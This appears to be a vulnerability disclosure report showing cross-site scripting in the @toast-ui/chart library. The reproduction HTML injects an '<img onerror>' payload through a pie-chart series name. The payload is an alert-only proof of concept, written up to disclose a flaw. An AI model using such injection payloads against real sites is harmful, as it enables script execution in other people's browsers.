# Description

`@toast-ui/chart` is vulnerable to `Cross-Site Scripting (XSS)`.

# Steps To Reproduce

Save and execute the following file in any browser
```
<html>
<head>
      <title>tui-chart</title>
</head>	  
<body>
     
      <link rel="stylesheet" href="https://uicdn.toast.com/chart/latest/toastui-chart.min.css" />
	  <script src="https://uicdn.toast.com/chart/latest/toastui-chart.min.js"></script>
	  <div id="chart-area"></div>
      <script type="text/javascript">   
        const el = document.getElementById('chart-area');
      const data = {
        categories: ['Browser'],
        series: [
          {
            name: 'Chrome"<img src=x onerror=alert(1)>',
            data: 46.02,
          },
          {
            name: 'IE',
            data: 20.47,
          },
          {
            name: 'Firefox',
            data: 17.71,
          },
          {
            name: 'Safari',
            data: 5.45,
          },
          {
            name: 'Opera',
            data: 3.1,
          },
          {
            name: 'Etc',
            data: 7.25,
          },
        ],
      };
      const options = {
        chart: { title: 'Usage share of web browsers', width: 600, height: 400 },
      };

      const chart = toastui.Chart.pieChart({ el, data, options });
    </script>
</body>
</html>
```
XSS payload will get executed.
